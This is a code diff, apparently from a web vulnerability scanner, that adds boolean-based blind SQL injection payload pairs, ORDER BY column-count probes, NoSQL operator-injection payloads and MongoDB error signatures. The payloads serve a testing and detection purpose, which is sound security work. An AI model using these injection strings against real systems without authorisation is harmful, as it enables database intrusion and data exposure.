@@ -72,3 +72,32 @@ export const SQL_ERROR_PATTERNS = [
   /Dynamic SQL Error/i,
   /unexpected end of SQL command/i,
 ];
+
+/** Boolean-based blind SQLi payload pairs — compare true vs false condition */
+export const SQLI_BOOLEAN_PAYLOADS: Array<{ truePayload: string; falsePayload: string }> = [
+  { truePayload: "' OR '1'='1", falsePayload: "' OR '1'='2" },
+  { truePayload: '1 OR 1=1', falsePayload: '1 OR 1=2' },
+  { truePayload: "' OR 1=1--", falsePayload: "' OR 1=2--" },
+];
+
+/** Union-based SQLi detection — ORDER BY probes to find column count */
+export const SQLI_UNION_ORDER_BY_PROBES = Array.from({ length: 10 }, (_, i) => `' ORDER BY ${i + 1}--`);
+
+/** NoSQL injection payloads */
+export const NOSQL_PAYLOADS = [
+  '{"$gt": ""}',
+  '{"$ne": null}',
+  '{"$regex": ".*"}',
+  '[$ne]=1',
+  '[$gt]=',
+  "true, $where: '1 == 1'",
+];
+
+/** NoSQL error signatures */
+export const NOSQL_ERROR_PATTERNS = [
+  /MongoError/i,
+  /mongo/i,
+  /BSON/i,
+  /ObjectId/i,
+  /mongoose/i,
+];
